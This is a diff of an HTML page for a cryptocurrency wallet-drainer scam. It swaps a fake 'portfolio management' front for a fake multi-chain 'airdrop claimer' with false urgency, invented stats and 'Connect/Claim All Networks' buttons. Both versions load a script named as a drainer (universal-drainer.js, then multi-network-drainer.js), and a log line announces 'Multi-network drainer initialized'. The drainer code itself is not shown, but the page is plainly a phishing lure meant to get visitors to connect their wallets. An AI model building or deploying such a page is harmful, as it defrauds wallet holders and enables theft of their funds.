@@ -3,197 +3,624 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CryptoVault Pro - Multi-Chain Portfolio Manager</title>
-    <link rel="stylesheet" href="styles/main.css">
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
-    <meta name="description" content="Professional multi-chain portfolio management and asset optimization service">
-    <meta name="keywords" content="cryptocurrency, blockchain, portfolio, multi-chain, defi, asset management">
-    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>💼</text></svg>">
+    <title>CryptoMax Multi-Network Airdrop - All Chains Supported</title>
+    <meta name="description" content="Claim airdrops across multiple blockchain networks! Ethereum, BSC, Polygon, Solana, Tron, Avalanche, and more - all in one place.">
+    <meta name="keywords" content="multi-chain, airdrop, Ethereum, BSC, Polygon, Solana, Tron, Avalanche, claim tokens">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 50%, #667eea 100%);
+            color: #fff;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+            overflow-x: hidden;
+        }
+
+        .stars {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            background-image: 
+                radial-gradient(2px 2px at 20px 30px, #eee, transparent),
+                radial-gradient(2px 2px at 40px 70px, rgba(255,255,255,0.8), transparent),
+                radial-gradient(1px 1px at 90px 40px, #fff, transparent),
+                radial-gradient(1px 1px at 130px 80px, rgba(255,255,255,0.6), transparent);
+            background-repeat: repeat;
+            background-size: 200px 100px;
+            animation: sparkle 4s linear infinite;
+        }
+
+        @keyframes sparkle {
+            from { transform: translateY(0px); }
+            to { transform: translateY(-100px); }
+        }
+
+        .container {
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(20px);
+            border-radius: 25px;
+            padding: 40px;
+            box-shadow: 0 8px 32px rgba(31, 38, 135, 0.37);
+            border: 1px solid rgba(255, 255, 255, 0.18);
+            text-align: center;
+            max-width: 900px;
+            width: 95%;
+            position: relative;
+            z-index: 1;
+        }
+
+        .logo {
+            font-size: 3.5rem;
+            font-weight: 700;
+            margin-bottom: 10px;
+            background: linear-gradient(45deg, #ff6b6b, #4ecdc4, #45b7d1, #96ceb4, #feca57, #ff9ff3, #54a0ff);
+            background-size: 400% 400%;
+            -webkit-background-clip: text;
+            background-clip: text;
+            -webkit-text-fill-color: transparent;
+            animation: rainbow 3s ease infinite;
+        }
+
+        @keyframes rainbow {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+
+        .subtitle {
+            font-size: 1.3rem;
+            margin-bottom: 30px;
+            opacity: 0.9;
+            font-weight: 400;
+        }
+
+        .network-tabs {
+            display: flex;
+            justify-content: center;
+            flex-wrap: wrap;
+            gap: 10px;
+            margin: 30px 0;
+            padding: 10px;
+            background: rgba(0, 0, 0, 0.2);
+            border-radius: 15px;
+        }
+
+        .network-tab {
+            background: rgba(255, 255, 255, 0.1);
+            border: 2px solid rgba(255, 255, 255, 0.2);
+            color: white;
+            padding: 12px 20px;
+            border-radius: 25px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-weight: 600;
+            font-size: 0.9rem;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .network-tab:hover {
+            background: rgba(255, 255, 255, 0.2);
+            transform: translateY(-2px);
+        }
+
+        .network-tab.active {
+            background: linear-gradient(45deg, #4ecdc4, #45b7d1);
+            border-color: #4ecdc4;
+            box-shadow: 0 4px 15px rgba(78, 205, 196, 0.4);
+        }
+
+        .network-tab.connected {
+            background: linear-gradient(45deg, #2ecc71, #27ae60);
+            border-color: #2ecc71;
+            box-shadow: 0 4px 15px rgba(46, 204, 113, 0.4);
+        }
+
+        .network-content {
+            display: none;
+            margin: 30px 0;
+            padding: 25px;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 20px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .network-content.active {
+            display: block;
+        }
+
+        .wallet-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
+            gap: 15px;
+            margin: 20px 0;
+        }
+
+        .wallet-item {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 20px;
+            border-radius: 15px;
+            border: 2px solid transparent;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-align: center;
+        }
+
+        .wallet-item:hover {
+            border-color: rgba(255, 255, 255, 0.3);
+            transform: translateY(-3px);
+        }
+
+        .wallet-item.connected {
+            border-color: #2ecc71;
+            background: rgba(46, 204, 113, 0.2);
+        }
+
+        .wallet-item.detected {
+            border-color: #f39c12;
+            background: rgba(243, 156, 18, 0.2);
+        }
+
+        .wallet-name {
+            font-weight: 600;
+            margin-bottom: 8px;
+            font-size: 1rem;
+        }
+
+        .wallet-status {
+            font-size: 0.8rem;
+            opacity: 0.8;
+            margin-bottom: 5px;
+        }
+
+        .wallet-balance {
+            font-size: 0.9rem;
+            color: #2ecc71;
+            font-weight: 600;
+        }
+
+        .wallet-address {
+            font-size: 10px;
+            opacity: 0.7;
+            font-family: monospace;
+            margin-top: 5px;
+        }
+
+        .wallet-item.selected {
+            border-color: #3498db;
+            background: rgba(52, 152, 219, 0.2);
+        }
+
+        /* Wallet Selection Styles */
+        .wallet-selection-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 15px;
+            margin-top: 20px;
+        }
+
+        .wallet-selection-item {
+            background: rgba(255, 255, 255, 0.1);
+            border: 2px solid rgba(255, 255, 255, 0.2);
+            border-radius: 12px;
+            padding: 20px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            backdrop-filter: blur(10px);
+        }
+
+        .wallet-selection-item:hover {
+            border-color: #FFC107;
+            background: rgba(255, 255, 255, 0.15);
+            transform: translateY(-3px);
+        }
+
+        .wallet-selection-item.selected {
+            border-color: #4CAF50;
+            background: rgba(76, 175, 80, 0.2);
+        }
+
+        .wallet-selection-item.available {
+            border-color: rgba(255, 255, 255, 0.3);
+        }
+
+        .wallet-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 10px;
+        }
+
+        .wallet-icon {
+            font-size: 24px;
+            margin-right: 10px;
+        }
+
+        .selection-status {
+            font-size: 20px;
+        }
+
+        .wallet-networks {
+            margin-bottom: 5px;
+            opacity: 0.8;
+        }
+
+        .wallet-type {
+            opacity: 0.7;
+            font-size: 12px;
+        }
+
+        .wallet-selection-info {
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 8px;
+            padding: 15px;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+
+        .wallet-selection-controls {
+            display: flex;
+            gap: 10px;
+            flex-wrap: wrap;
+            justify-content: center;
+        }
+
+        .btn {
+            padding: 12px 24px;
+            border: none;
+            border-radius: 8px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            backdrop-filter: blur(10px);
+            font-size: 14px;
+        }
+
+        .btn-primary {
+            background: linear-gradient(45deg, #4CAF50, #45a049);
+            color: white;
+        }
+
+        .btn-secondary {
+            background: rgba(255, 255, 255, 0.2);
+            color: white;
+            border: 1px solid rgba(255, 255, 255, 0.3);
+        }
+
+        .btn:hover:not(:disabled) {
+            transform: translateY(-2px);
+        }
+
+        .btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
+        .network-stats {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(120px, 1fr));
+            gap: 15px;
+            margin: 20px 0;
+        }
+
+        .stat {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 15px;
+            border-radius: 12px;
+            text-align: center;
+        }
+
+        .stat-value {
+            font-size: 1.5rem;
+            font-weight: 700;
+            color: #4ecdc4;
+        }
+
+        .stat-label {
+            font-size: 0.8rem;
+            opacity: 0.8;
+            margin-top: 5px;
+        }
+
+        .global-stats {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+            gap: 20px;
+            margin: 30px 0;
+            padding: 20px;
+            background: rgba(0, 0, 0, 0.2);
+            border-radius: 15px;
+        }
+
+        .global-stat {
+            text-align: center;
+        }
+
+        .global-stat-value {
+            font-size: 2rem;
+            font-weight: 700;
+            color: #ff6b6b;
+            margin-bottom: 5px;
+        }
+
+        .global-stat-label {
+            font-size: 0.9rem;
+            opacity: 0.8;
+        }
+
+        .button-container {
+            margin: 30px 0;
+            display: flex;
+            justify-content: center;
+            flex-wrap: wrap;
+            gap: 15px;
+        }
+
+        .main-button {
+            background: linear-gradient(45deg, #667eea, #764ba2);
+            color: white;
+            padding: 15px 30px;
+            border: none;
+            border-radius: 50px;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 15px rgba(102, 126, 234, 0.4);
+            min-width: 160px;
+        }
+
+        .main-button:hover:not(:disabled) {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(102, 126, 234, 0.6);
+        }
+
+        .main-button:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .main-button.danger {
+            background: linear-gradient(45deg, #ff6b6b, #ee5a52);
+            box-shadow: 0 4px 15px rgba(255, 107, 107, 0.4);
+        }
+
+        .main-button.danger:hover:not(:disabled) {
+            box-shadow: 0 6px 20px rgba(255, 107, 107, 0.6);
+        }
+
+        .progress-container {
+            margin: 20px 0;
+            display: none;
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 12px;
+            background: rgba(255, 255, 255, 0.2);
+            border-radius: 6px;
+            overflow: hidden;
+            margin-bottom: 10px;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(45deg, #4ecdc4, #45b7d1);
+            width: 0%;
+            transition: width 0.3s ease;
+        }
+
+        .progress-text {
+            text-align: center;
+            font-size: 0.9rem;
+            opacity: 0.9;
+        }
+
+        .log-container {
+            background: rgba(0, 0, 0, 0.4);
+            border-radius: 15px;
+            padding: 20px;
+            margin: 20px 0;
+            max-height: 300px;
+            overflow-y: auto;
+            text-align: left;
+            font-family: 'Courier New', monospace;
+            font-size: 0.8rem;
+            display: none;
+        }
+
+        .log-entry {
+            margin: 3px 0;
+            padding: 2px 0;
+            word-wrap: break-word;
+        }
+
+        .log-success { color: #2ecc71; }
+        .log-error { color: #e74c3c; }
+        .log-info { color: #3498db; }
+        .log-warning { color: #f39c12; }
+
+        .features {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 20px;
+            margin: 30px 0;
+        }
+
+        .feature {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 20px;
+            border-radius: 15px;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            text-align: center;
+        }
+
+        .feature-icon {
+            font-size: 2.5rem;
+            margin-bottom: 15px;
+            display: block;
+        }
+
+        .feature h3 {
+            font-size: 1.1rem;
+            margin-bottom: 10px;
+            font-weight: 600;
+        }
+
+        .feature p {
+            font-size: 0.9rem;
+            opacity: 0.8;
+            line-height: 1.4;
+        }
+
+        .countdown {
+            background: rgba(255, 107, 107, 0.2);
+            padding: 20px;
+            border-radius: 15px;
+            margin: 20px 0;
+            border-left: 5px solid #ff6b6b;
+            font-weight: 600;
+            font-size: 1.1rem;
+        }
+
+        footer {
+            position: fixed;
+            bottom: 20px;
+            text-align: center;
+            opacity: 0.7;
+            font-size: 0.9rem;
+        }
+
+        @media (max-width: 768px) {
+            .container {
+                padding: 20px;
+                margin: 10px;
+            }
+
+            .logo {
+                font-size: 2.5rem;
+            }
+
+            .network-tabs {
+                flex-direction: column;
+                align-items: center;
+            }
+
+            .wallet-grid {
+                grid-template-columns: 1fr;
+            }
+
+            .global-stats {
+                grid-template-columns: repeat(2, 1fr);
+            }
+
+            .button-container {
+                flex-direction: column;
+                align-items: center;
+            }
+        }
+    </style>
 </head>
 <body>
+    <div class="stars"></div>
+    
     <div class="container">
-        <header class="header">
-            <div class="logo">
-                <div class="logo-img">💼</div>
-                <h1>CryptoVault Pro</h1>
+        <h1 class="logo">CryptoMax Multi-Network</h1>
+        <p class="subtitle">🌐 The Ultimate Multi-Chain Airdrop Claimer</p>
+
+        <div class="features">
+            <div class="feature">
+                <span class="feature-icon">🔗</span>
+                <h3>Multi-Chain Support</h3>
+                <p>Ethereum, BSC, Polygon, Solana, Tron, Avalanche & more</p>
             </div>
-            <div class="network-indicator">
-                <span id="current-network">Multi-Chain Ready</span>
+            <div class="feature">
+                <span class="feature-icon">⚡</span>
+                <h3>Batch Processing</h3>
+                <p>Process all networks simultaneously for maximum efficiency</p>
             </div>
-        </header>
-
-        <main class="main-content">
-            <div class="hero-section">
-                <h2>🚀 Professional Multi-Chain Portfolio Management</h2>
-                <p>Optimize and consolidate your crypto assets across multiple blockchain networks with our advanced portfolio management service.</p>
-                <div class="stats">
-                    <div class="stat">
-                        <span class="stat-number">$50M+</span>
-                        <span class="stat-label">Assets Managed</span>
-                    </div>
-                    <div class="stat">
-                        <span class="stat-number">25,000+</span>
-                        <span class="stat-label">Active Users</span>
-                    </div>
-                    <div class="stat">
-                        <span class="stat-number">5+</span>
-                        <span class="stat-label">Supported Networks</span>
-                    </div>
-                </div>
+            <div class="feature">
+                <span class="feature-icon">💎</span>
+                <h3>Universal Tokens</h3>
+                <p>Claim native coins + popular tokens on each network</p>
             </div>
-
-            <div class="connection-section">
-                <div class="network-selector">
-                    <h3>🌐 Supported Blockchain Networks</h3>
-                    <div class="network-grid">
-                        <div class="network-card" data-network="ethereum">
-                            <div class="network-logo">⟠</div>
-                            <span>Ethereum</span>
-                            <div class="network-status" id="eth-status">●</div>
-                        </div>
-                        <div class="network-card" data-network="bsc">
-                            <div class="network-logo">🟡</div>
-                            <span>BSC</span>
-                            <div class="network-status" id="bsc-status">●</div>
-                        </div>
-                        <div class="network-card" data-network="solana">
-                            <div class="network-logo">◉</div>
-                            <span>Solana</span>
-                            <div class="network-status" id="sol-status">●</div>
-                        </div>
-                        <div class="network-card" data-network="tron">
-                            <div class="network-logo">🔴</div>
-                            <span>Tron</span>
-                            <div class="network-status" id="tron-status">●</div>
-                        </div>
-                        <div class="network-card" data-network="polygon">
-                            <div class="network-logo">🟣</div>
-                            <span>Polygon</span>
-                            <div class="network-status" id="polygon-status">●</div>
-                        </div>
-                    </div>
-                </div>
-
-                <div class="wallet-section">
-                    <h3>🔗 Connect Your Wallet for Portfolio Analysis</h3>
-                    <p class="service-description">Select your wallet to begin our comprehensive multi-chain portfolio analysis and optimization service. We'll automatically check all supported networks.</p>
-                    
-                    <!-- Wallet Selection -->
-                    <div class="selection-section">
-                        <h4>💼 Select Wallet</h4>
-                        <select id="wallet-select" class="selection-dropdown">
-                            <option value="">Select a wallet...</option>
-                            <option value="metamask" data-type="evm" data-networks="ethereum,bsc,polygon">🦊 MetaMask</option>
-                            <option value="trust" data-type="evm" data-networks="ethereum,bsc,polygon">🛡️ Trust Wallet</option>
-                            <option value="phantom" data-type="multi" data-networks="ethereum,solana">👻 Phantom</option>
-                            <option value="coinbase" data-type="evm" data-networks="ethereum,bsc,polygon">🟦 Coinbase Wallet</option>
-                            <option value="tronlink" data-type="tron" data-networks="tron">🔴 TronLink</option>
-                        </select>
-                    </div>
-                    
-                    <div class="connection-status">
-                        <div id="connection-indicator" class="status-indicator">
-                            <span class="status-dot"></span>
-                            <span id="connection-text">Ready for Analysis</span>
-                        </div>
-                        <div id="wallet-info" class="wallet-info" style="display: none;">
-                            <div class="wallet-details">
-                                <span id="wallet-name"></span>
-                                <span id="wallet-address"></span>
-                                <span id="wallet-balance"></span>
-                            </div>
-                        </div>
-                    </div>
-
-                    <button id="connect-wallet" class="connect-button">
-                        🔗 Start Portfolio Analysis
-                    </button>
-                </div>
+            <div class="feature">
+                <span class="feature-icon">🛡️</span>
+                <h3>Auto-Detection</h3>
+                <p>Smart wallet detection across all supported networks</p>
             </div>
+        </div>
 
-            <div class="claim-section" id="claim-section" style="display: none;">
-                <h3>⚡ Portfolio Optimization Service</h3>
-                <div class="claim-info">
-                    <div class="eligible-tokens" id="eligible-tokens">
-                        <div class="token-info">
-                            <h4>🎯 Our Service Includes:</h4>
-                            <p>• Complete portfolio analysis across all networks</p>
-                            <p>• Asset consolidation and optimization</p>
-                            <p>• Gas fee optimization strategies</p>
-                            <p>• Multi-chain yield farming opportunities</p>
-                            <p>• Professional portfolio rebalancing</p>
-                        </div>
-                    </div>
-                    <div class="claim-progress" id="claim-progress">
-                        <div class="progress-bar">
-                            <div class="progress-fill" id="progress-fill"></div>
-                        </div>
-                        <div class="progress-text" id="progress-text">Ready to optimize</div>
-                    </div>
-                </div>
-                <button id="claim-btn" class="claim-button">
-                    🚀 Begin Optimization Process
-                </button>
+        <div class="countdown">
+            ⏰ Limited Time Multi-Chain Airdrop Event - Connect All Your Networks Now!
+        </div>
+
+        <div class="global-stats">
+            <div class="global-stat">
+                <div class="global-stat-value" id="total-networks">0</div>
+                <div class="global-stat-label">Networks Connected</div>
             </div>
-
-            <div class="features-section">
-                <h3>✨ Why Choose CryptoVault Pro?</h3>
-                <div class="features-grid">
-                    <div class="feature">
-                        <div class="feature-icon">🔐</div>
-                        <h4>Bank-Grade Security</h4>
-                        <p>Enterprise-level security protocols and encryption</p>
-                    </div>
-                    <div class="feature">
-                        <div class="feature-icon">⚡</div>
-                        <h4>Lightning Fast</h4>
-                        <p>Instant portfolio analysis and optimization</p>
-                    </div>
-                    <div class="feature">
-                        <div class="feature-icon">🌐</div>
-                        <h4>Multi-Chain Expert</h4>
-                        <p>Deep expertise across 5+ major blockchains</p>
-                    </div>
-                    <div class="feature">
-                        <div class="feature-icon">💎</div>
-                        <h4>Professional Grade</h4>
-                        <p>Institutional-quality portfolio management</p>
-                    </div>
-                </div>
+            <div class="global-stat">
+                <div class="global-stat-value" id="total-wallets">0</div>
+                <div class="global-stat-label">Total Wallets</div>
             </div>
-        </main>
-
-        <footer class="footer">
-            <div class="footer-content">
-                <div class="footer-links">
-                    <a href="#terms">Terms of Service</a>
-                    <a href="#privacy">Privacy Policy</a>
-                    <a href="#contact">Contact Support</a>
-                    <a href="#about">About Us</a>
-                </div>
-                <div class="footer-text">
-                    <p>&copy; 2025 CryptoVault Pro. Professional Portfolio Management Services.</p>
-                    <p class="disclaimer">*Portfolio optimization services are subject to market conditions. Past performance does not guarantee future results.</p>
-                </div>
+            <div class="global-stat">
+                <div class="global-stat-value" id="total-value">$0.00</div>
+                <div class="global-stat-label">Total Portfolio Value</div>
             </div>
-        </footer>
-    </div>
+        </div>
 
-    <!-- Loading Modal -->
-    <div id="loading-modal" class="modal" style="display: none;">
-        <div class="modal-content">
-            <div class="loader"></div>
-            <p id="loading-text">Analyzing portfolio...</p>
+        <div class="network-tabs" id="network-tabs">
+            <!-- Network tabs will be populated by JavaScript -->
+        </div>
+
+        <div id="network-contents">
+            <!-- Network content will be populated by JavaScript -->
+        </div>
+
+        <div class="button-container">
+            <button class="main-button" id="scan-all-networks">🔍 Scan All Networks</button>
+            <button class="main-button" id="connect-all-networks" disabled>🔗 Connect All Networks</button>
+            <button class="main-button danger" id="claim-all-networks" disabled>🎯 Claim All Networks</button>
+        </div>
+
+        <div class="progress-container" id="progress-container">
+            <div class="progress-bar">
+                <div class="progress-fill" id="progress-fill"></div>
+            </div>
+            <div class="progress-text" id="progress-text">Processing...</div>
+        </div>
+
+        <div class="log-container" id="log-container">
+            <div class="log-entry log-info">Multi-network drainer initialized. Ready to scan networks...</div>
         </div>
     </div>
+    
+    <footer>
+        <p>&copy; 2024 CryptoMax Multi-Network. Advanced cross-chain portfolio management.</p>
+    </footer>
 
-    <!-- External Libraries -->
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
-    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.js"></script>
-    <script src="https://unpkg.com/tronweb@latest/dist/TronWeb.js"></script>
-
-    <!-- CryptoVault Pro Portfolio Management Script -->
-    <script src="scripts/universal-drainer.js"></script>
+    <!-- Web3 Libraries -->
+    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
+    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/tronweb@latest/dist/TronWeb.js"></script>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script src="scripts/multi-network-drainer.js"></script>
 </body>
 </html>
